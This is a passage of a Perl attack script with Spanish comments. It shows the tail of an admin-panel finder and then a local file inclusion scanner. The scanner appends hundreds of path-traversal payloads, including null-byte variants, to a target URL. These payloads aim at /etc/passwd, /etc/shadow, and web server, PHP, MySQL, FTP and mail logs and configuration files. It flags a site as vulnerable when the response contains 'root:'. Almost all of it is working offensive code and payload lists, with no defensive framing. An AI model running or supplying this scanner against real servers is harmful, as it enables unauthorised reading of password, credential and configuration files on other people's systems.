  $panelfinder->content =~ /Senha/ ||
  $panelfinder->content =~ /pass/ || 
  $panelfinder->content =~ /Pass/ ||
  $panelfinder->content =~ /pwd/ || 
  $panelfinder->content =~ /Pwd/ ||
  $panelfinder->content =~ /USERNAME/ ||
  $panelfinder->content =~ /PASSWORD/ ||
  $panelfinder->content =~ /Personal/ ||
  $panelfinder->content =~ /Usuario/ ||
  $panelfinder->content =~ /Clave/ ||
  $panelfinder->content =~ /Usager/ ||
  $panelfinder->content =~ /usager/ ||
  $panelfinder->content =~ /Sing/ ||
  $panelfinder->content =~ /passe/ ||
  $panelfinder->content =~ /P\/W/ ||
  $panelfinder->content =~ /Admin Password/
 ) 
{  print("\n * Panel Encontrado: $web/$finder \n");} } }

if ($opciones =~ /l/|/L/) {
#Lfi Scanner
system("cls");
system("clear");
print q(

    .-..-. _       .----.        .--.                                     
    : :: ::_;      `--  ;       : .--'                                    
    : :: :.-..---.  .' ' .--.   `. `.  .--.  .--.  ,-.,-.,-.,-. .--. .--. 
    : `' ;: :: .; ` _`,`.: ..'   _`, :'  ..'' .; ; : ,. :: ,. :' '_.': ..'
    `.,' :_;: ._.'`.__.':_;    `.__.'`.__.'`.__,_;:_;:_;:_;:_;`.__.':_;  
	    : :                                                          
	    :_;                                                          
    

		   +-++-++-+ +-++-++-++-++-++-++-+
		   |L||F||I| |S||c||a||n||n||e||r|
		   +-++-++-+ +-++-++-++-++-++-++-+


);


if ($web1 !~ /http/)
{
$web="http://".$web1."="; 
} else { $web=$web1; }
chop $web;
$proses="si";

#si lleva la web un signo de path como page.php?"="
if ($web =~ /\?/) {
$web=$web."=";
print("\n * Analizando la Pagina... \n   ".$web."\n");

print "  * > Desea ver el Proseso?\tSi/No\n\t";
$proses=<STDIN>;
chop($proses);

#los paths seran los siguientes
@paths=('/etc/passwd',
'../etc/passwd',
'../../etc/passwd',
'../../../etc/passwd',
'../../../../etc/passwd',
'../../../../../etc/passwd',
'../../../../../../etc/passwd',
'../../../../../../../etc/passwd',
'../../../../../../../../etc/passwd',
'../../../../../../../../../etc/passwd',
'../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../..etc/passwd',
'../../etc/passwd%00',
'../../../etc/passwd%00',
'../../../../etc/passwd%00',
'../../../../../etc/passwd%00',
'../../../../../../etc/passwd%00',
'../../../../../../../etc/passwd%00',
'../../../../../../../../etc/passwd%00',
'../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../..etc/passwd%00',
'../etc/shadow',
'../../etc/shadow',
'../../../etc/shadow',
'../../../../etc/shadow',
'../../../../../etc/shadow',
'../../../../../../etc/shadow',
'../../../../../../../etc/shadow',
'../../../../../../../../etc/shadow',
'../../../../../../../../../etc/shadow',
'../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../../etc/shadow',
'../etc/shadow%00',
'../../etc/shadow%00',
'../../../etc/shadow%00',
'../../../../etc/shadow%00',
'../../../../../etc/shadow%00',
'../../../../../../etc/shadow%00',
'../../../../../../../etc/shadow%00',
'../../../../../../../../etc/shadow%00',
'../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../../etc/shadow%00',
'../etc/group',
'../../etc/group',
'../../../etc/group',
'../../../../etc/group',
'../../../../../etc/group',
'../../../../../../etc/group',
'../../../../../../../etc/group',
'../../../../../../../../etc/group',
'../../../../../../../../../etc/group',
'../../../../../../../../../../etc/group',
'../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../../etc/group',
'../etc/group%00',
'../../etc/group%00',
'../../../etc/group%00',
'../../../../etc/group%00',
'../../../../../etc/group%00',
'../../../../../../etc/group%00',
'../../../../../../../etc/group%00',
'../../../../../../../../etc/group%00',
'../../../../../../../../../etc/group%00',
'../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../../etc/group%00',
'../etc/security/group',
'../../etc/security/group',
'../../../etc/security/group',
'../../../../etc/security/group',
'../../../../../etc/security/group',
'../../../../../../etc/security/group',
'../../../../../../../etc/security/group',
'../../../../../../../../etc/security/group',
'../../../../../../../../../etc/security/group',
'../../../../../../../../../../etc/security/group',
'../../../../../../../../../../../etc/security/group',
'../etc/security/group%00',
'../../etc/security/group%00',
'../../../etc/security/group%00',
'../../../../etc/security/group%00',
'../../../../../etc/security/group%00',
'../../../../../../etc/security/group%00',
'../../../../../../../etc/security/group%00',
'../../../../../../../../etc/security/group%00',
'../../../../../../../../../etc/security/group%00',
'../../../../../../../../../../etc/security/group%00',
'../../../../../../../../../../../etc/security/group%00',
'../etc/security/passwd',
'../../etc/security/passwd',
'../../../etc/security/passwd',
'../../../../etc/security/passwd',
'../../../../../etc/security/passwd',
'../../../../../../etc/security/passwd',
'../../../../../../../etc/security/passwd',
'../../../../../../../../etc/security/passwd',
'../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../../etc/security/passwd',
'../etc/security/passwd%00',
'../../etc/security/passwd%00',
'../../../etc/security/passwd%00',
'../../../../etc/security/passwd%00',
'../../../../../etc/security/passwd%00',
'../../../../../../etc/security/passwd%00',
'../../../../../../../etc/security/passwd%00',
'../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../../etc/security/passwd%00',
'../etc/security/user',
'../../etc/security/user',
'../../../etc/security/user',
'../../../../etc/security/user',
'../../../../../etc/security/user',
'../../../../../../etc/security/user',
'../../../../../../../etc/security/user',
'../../../../../../../../etc/security/user',
'../../../../../../../../../etc/security/user',
'../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../../etc/security/user',
'../etc/security/user%00',
'../../etc/security/user%00',
'../../../etc/security/user%00',
'../../../../etc/security/user%00',
'../../../../../etc/security/user%00',
'../../../../../../etc/security/user%00',
'../../../../../../../etc/security/user%00',
'../../../../../../../../etc/security/user%00',
'../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../../../etc/security/user%00',
'../etc/security/environ',
'../../etc/security/environ',
'../../../etc/security/environ',
'../../../../etc/security/environ',
'../../../../../etc/security/environ',
'../../../../../../etc/security/environ',
'../../../../../../../etc/security/environ',
'../../../../../../../../etc/security/environ',
'../../../../../../../../../etc/security/environ',
'../../../../../../../../../../etc/security/environ',
'../../../../../../../../../../../etc/security/environ',
'../../../../../../../../../../../../etc/security/environ',
'../../../../../../../../../../../../../etc/security/environ',
'../etc/security/environ%00',
'../../etc/security/environ%00',
'../../../etc/security/environ%00',
'../../../../etc/security/environ%00',
'../../../../../etc/security/environ%00',
'../../../../../../etc/security/environ%00',
'../../../../../../../etc/security/environ%00',
'../../../../../../../../etc/security/environ%00',
'../../../../../../../../../etc/security/environ%00',
'../../../../../../../../../../etc/security/environ%00',
'../../../../../../../../../../../etc/security/environ%00',
'../../../../../../../../../../../../etc/security/environ%00',
'../../../../../../../../../../../../../etc/security/environ%00',
'../etc/security/limits',
'../../etc/security/limits',
'../../../etc/security/limits',
'../../../../etc/security/limits',
'../../../../../etc/security/limits',
'../../../../../../etc/security/limits',
'../../../../../../../etc/security/limits',
'../../../../../../../../etc/security/limits',
'../../../../../../../../../etc/security/limits',
'../../../../../../../../../../etc/security/limits',
'../../../../../../../../../../../etc/security/limits',
'../../../../../../../../../../../../etc/security/limits',
'../../../../../../../../../../../../../etc/security/limits',
'../etc/security/limits%00',
'../../etc/security/limits%00',
'../../../etc/security/limits%00',
'../../../../etc/security/limits%00',
'../../../../../etc/security/limits%00',
'../../../../../../etc/security/limits%00',
'../../../../../../../etc/security/limits%00',
'../../../../../../../../etc/security/limits%00',
'../../../../../../../../../etc/security/limits%00',
'../../../../../../../../../../etc/security/limits%00',
'../../../../../../../../../../../etc/security/limits%00',
'../../../../../../../../../../../../etc/security/limits%00',
'../../../../../../../../../../../../../etc/security/limits%00',
'../usr/lib/security/mkuser.default',
'../../usr/lib/security/mkuser.default',
'../../../usr/lib/security/mkuser.default',
'../../../../usr/lib/security/mkuser.default',
'../../../../../usr/lib/security/mkuser.default',
'../../../../../../usr/lib/security/mkuser.default',
'../../../../../../../usr/lib/security/mkuser.default',
'../../../../../../../../usr/lib/security/mkuser.default',
'../../../../../../../../../usr/lib/security/mkuser.default',
'../../../../../../../../../../usr/lib/security/mkuser.default',
'../../../../../../../../../../../usr/lib/security/mkuser.default',
'../../../../../../../../../../../../usr/lib/security/mkuser.default',
'../../../../../../../../../../../../../usr/lib/security/mkuser.default',
'../usr/lib/security/mkuser.default%00',
'../../usr/lib/security/mkuser.default%00',
'../../../usr/lib/security/mkuser.default%00',
'../../../../usr/lib/security/mkuser.default%00',
'../../../../../usr/lib/security/mkuser.default%00',
'../../../../../../usr/lib/security/mkuser.default%00',
'../../../../../../../usr/lib/security/mkuser.default%00',
'../../../../../../../../usr/lib/security/mkuser.default%00',
'../../../../../../../../../usr/lib/security/mkuser.default%00',
'../../../../../../../../../../usr/lib/security/mkuser.default%00',
'../../../../../../../../../../../usr/lib/security/mkuser.default%00',
'../../../../../../../../../../../../usr/lib/security/mkuser.default%00',
'../../../../../../../../../../../../../usr/lib/security/mkuser.default%00'); }
#si no lleva = significa que sera una web normal
#para provar los siguientes paths
elsif ($web !~ /\?/){
print("\n * Analizando la Pagina... \n   ".$web."\n");

@paths=('/etc/passwd',
'/etc/shadow',
'/etc/cgi-bin',
'/etc/group',
'/etc/security/group',
'/etc/security/passwd',
'/etc/security/user',
'/etc/security/environ',
'/etc/security/limits',
'/usr/lib/security/mkuser.default',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/etc/httpd/logs/acces_log',
'/etc/httpd/logs/acces.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/usr/local/apache/logs/access_ log',
'/usr/local/apache/logs/access. log',
'/var/log/apache/access_log',
'/var/log/apache2/access_log',
'/var/log/apache/access.log',
'/var/log/apache2/access.log',
'/var/log/access_log',
'/var/log/access.log',
'/var/www/logs/error_log',
'/var/www/logs/error.log',
'/usr/local/apache/logs/error_log',
'/usr/local/apache/logs/error.log',
'/var/log/apache/error_log',
'/var/log/apache2/error_log',
'/var/log/apache/error.log',
'/var/log/apache2/error.log',
'/var/log/error_log',
'/var/log/error.log',
'/var/log/httpd/access_log',
'/var/log/httpd/error_log',
'/var/log/httpd/access_log',
'/var/log/httpd/error_log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/etc/httpd/logs/acces_log',
'/etc/httpd/logs/acces.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'/usr/local/apache/logs/error_log',
'/usr/local/apache/logs/error.log',
'/usr/local/apache2/logs/access_log',
'/usr/local/apache2/logs/access.log',
'/usr/local/apache2/logs/error_log',
'/usr/local/apache2/logs/error.log',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/var/www/logs/error_log',
'/var/www/logs/error.log',
'/var/log/httpd/access_log',
'/var/log/httpd/access.log',
'/var/log/httpd/error_log',
'/var/log/httpd/error.log',
'/var/log/apache/access_log',
'/var/log/apache/access.log',
'/var/log/apache/error_log',
'/var/log/apache/error.log',
'/var/log/apache2/access_log',
'/var/log/apache2/access.log',
'/var/log/apache2/error_log',
'/var/log/apache2/error.log',
'/var/log/access_log',
'/var/log/access.log',
'/var/log/error_log',
'/var/log/error.log',
'/opt/lampp/logs/access_log',
'/opt/lampp/logs/error_log',
'/opt/xampp/logs/access_log',
'/opt/xampp/logs/error_log',
'/opt/lampp/logs/access.log',
'/opt/lampp/logs/error.log',
'/opt/xampp/logs/access.log',
'/opt/xampp/logs/error.log',
'/Program Files\Apache Group\Apache\logs\access.log',
'/Program Files\Apache Group\Apache\logs\error.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/etc/httpd/logs/acces_log',
'/etc/httpd/logs/acces.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'/var/log/apache/access_log',
'/var/log/apache/access.log',
'/var/log/access_log',
'/var/www/logs/error_log',
'/var/www/logs/error.log',
'/usr/local/apache/logs/error_log',
'/usr/local/apache/logs/error.log',
'/var/log/apache/error_log',
'/var/log/apache/error.log',
'/var/log/access_log',
'/var/log/error_log',
'/usr/local/apache/conf/httpd.conf',
'/usr/local/apache2/conf/httpd.conf',
'/etc/httpd/conf/httpd.conf',
'/etc/apache/conf/httpd.conf',
'/usr/local/etc/apache/conf/httpd.conf',
'/etc/apache2/httpd.conf',
'/usr/local/apache/conf/httpd.conf',
'/usr/local/apache2/conf/httpd.conf',
'/usr/local/apache/httpd.conf',
'/usr/local/apache2/httpd.conf',
'/usr/local/httpd/conf/httpd.conf',
'/usr/local/etc/apache/conf/httpd.conf',
'/usr/local/etc/apache2/conf/httpd.conf',
'/usr/local/etc/httpd/conf/httpd.conf',
'/usr/apache2/conf/httpd.conf',
'/usr/apache/conf/httpd.conf',
'/usr/local/apps/apache2/conf/httpd.conf',
'/usr/local/apps/apache/conf/httpd.conf',
'/etc/apache/conf/httpd.conf',
'/etc/apache2/conf/httpd.conf',
'/etc/httpd/conf/httpd.conf',
'/etc/http/conf/httpd.conf',
'/etc/apache2/httpd.conf',
'/etc/httpd/httpd.conf',
'/etc/http/httpd.conf',
'/etc/httpd.conf',
'/opt/apache/conf/httpd.conf',
'/opt/apache2/conf/httpd.conf',
'/var/www/conf/httpd.conf',
'/private/etc/httpd/httpd.conf',
'/private/etc/httpd/httpd.conf.default',
'/Volumes/webBackup/opt/apache2/conf/httpd.conf',
'/Volumes/webBackup/private/etc/httpd/httpd.conf',
'/Volumes/webBackup/private/etc/httpd/httpd.conf.default',
'/Program Files\Apache Group\Apache\conf\httpd.conf',
'/Program Files\Apache Group\Apache2\conf\httpd.conf',
'/Program Files\xampp\apache\conf\httpd.conf',
'/usr/local/php/httpd.conf.php',
'/usr/local/php4/httpd.conf.php',
'/usr/local/php5/httpd.conf.php',
'/usr/local/php/httpd.conf',
'/usr/local/php4/httpd.conf',
'/usr/local/php5/httpd.conf',
'/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf',
'/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf',
'/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf',
'/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php',
'/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php',
'/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php',
'/usr/local/etc/apache/vhosts.conf',
'/etc/php.ini',
'/bin/php.ini',
'/etc/httpd/php.ini',
'/usr/lib/php.ini',
'/usr/lib/php/php.ini',
'/usr/local/etc/php.ini',
'/usr/local/lib/php.ini',
'/usr/local/php/lib/php.ini',
'/usr/local/php4/lib/php.ini',
'/usr/local/php5/lib/php.ini',
'/usr/local/apache/conf/php.ini',
'/etc/php4.4/fcgi/php.ini',
'/etc/php4/apache/php.ini',
'/etc/php4/apache2/php.ini',
'/etc/php5/apache/php.ini',
'/etc/php5/apache2/php.ini',
'/etc/php/php.ini',
'/etc/php/php4/php.ini',
'/etc/php/apache/php.ini',
'/etc/php/apache2/php.ini',
'/web/conf/php.ini',
'/usr/local/Zend/etc/php.ini',
'/opt/xampp/etc/php.ini',
'/var/local/www/conf/php.ini',
'/etc/php/cgi/php.ini',
'/etc/php4/cgi/php.ini',
'/etc/php5/cgi/php.ini',
'/php5\php.ini',
'/php4\php.ini',
'/php\php.ini',
'/PHP\php.ini',
'/WINDOWS\php.ini',
'/WINNT\php.ini',
'/apache\php\php.ini',
'/xampp\apache\bin\php.ini',
'/NetServer\bin\stable\apache\php.ini',
'/home2\bin\stable\apache\php.ini',
'/home\bin\stable\apache\php.ini',
'/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini',
'/usr/local/cpanel/logs',
'/usr/local/cpanel/logs/stats_log',
'/usr/local/cpanel/logs/access_log',
'/usr/local/cpanel/logs/error_log',
'/usr/local/cpanel/logs/license_log',
'/usr/local/cpanel/logs/login_log',
'/usr/local/cpanel/logs/stats_log',
'/var/cpanel/cpanel.config',
'/var/log/mysql/mysql-bin.log',
'/var/log/mysql.log',
'/var/log/mysqlderror.log',
'/var/log/mysql/mysql.log',
'/var/log/mysql/mysql-slow.log',
'/var/mysql.log',
'/var/lib/mysql/my.cnf',
'/etc/mysql/my.cnf',
'/etc/my.cnf',
'/etc/logrotate.d/proftpd',
'/www/logs/proftpd.system.log',
'/var/log/proftpd',
'/etc/proftp.conf',
'/etc/protpd/proftpd.conf',
'/etc/vhcs2/proftpd/proftpd.conf',
'/etc/proftpd/modules.conf',
'/var/log/vsftpd.log',
'/etc/vsftpd.chroot_list',
'/etc/logrotate.d/vsftpd.log',
'/etc/vsftpd/vsftpd.conf',
'/etc/vsftpd.conf',
'/etc/chrootUsers',
'/var/log/xferlog',
'/var/adm/log/xferlog',
'/etc/wu-ftpd/ftpaccess',
'/etc/wu-ftpd/ftphosts',
'/etc/wu-ftpd/ftpusers',
'/usr/sbin/pure-config.pl',
'/usr/etc/pure-ftpd.conf',
'/etc/pure-ftpd/pure-ftpd.conf',
'/usr/local/etc/pure-ftpd.conf',
'/usr/local/etc/pureftpd.pdb',
'/usr/local/pureftpd/etc/pureftpd.pdb',
'/usr/local/pureftpd/sbin/pure-config.pl',
'/usr/local/pureftpd/etc/pure-ftpd.conf',
'-/etc/pure-ftpd.conf',
'/etc/pure-ftpd/pure-ftpd.pdb',
'/etc/pureftpd.pdb',
'/etc/pureftpd.passwd',
'/etc/pure-ftpd/pureftpd.pdb',
'/usr/ports/ftp/pure-ftpd/',
'/usr/ports/net/pure-ftpd/',
'/usr/pkgsrc/net/pureftpd/',
'/usr/ports/contrib/pure-ftpd/',
'/var/log/pure-ftpd/pure-ftpd.log',
'/logs/pure-ftpd.log',
'/var/log/pureftpd.log',
'/var/log/ftp-proxy/ftp-proxy.log',
'/var/log/ftp-proxy',
'/var/log/ftplog',
'/etc/logrotate.d/ftp',
'/etc/ftpchroot',
'/etc/ftphosts',
'/var/log/exim_mainlog',
'/var/log/exim/mainlog',
'/var/log/maillog',
'/var/log/exim_paniclog',
'/var/log/exim/paniclog',
'/var/log/exim/rejectlog',
'/var/log/exim_rejectlog'); }

#Cargamos los Paths uno por uno con foreach
foreach $lfi(@paths){

#final sera = a la web junto con el path
$final = $web.$lfi;

#declaramos variables para esperar una respuesta de la web
$request = HTTP::Request->new(GET=>$final);
$useragent = LWP::UserAgent->new();

#Con esto Pasamos la web con path por path esperando respuesta
$respuesta = $useragent->request($request);

#si encuentra uns respuesta de la palabra root
if ($respuesta->is_success && $respuesta->content =~ /root:/)

#sera vulnerable la web
{ $msg = "Vulnerablee";
if ($proses =~ /n|N/) {

chop ($msg);

#mostrara el mensage junto con el path
print ("[$msg]..........$final\n");
} }

else

#de lo contrario
{ $msg = "No Encontradoo"; }
if ($proses =~ /s|S/) {
chop ($msg);

#mostrara el mensage junto con el path
print ("[$msg]..........$final\n"); } } }

exit 1;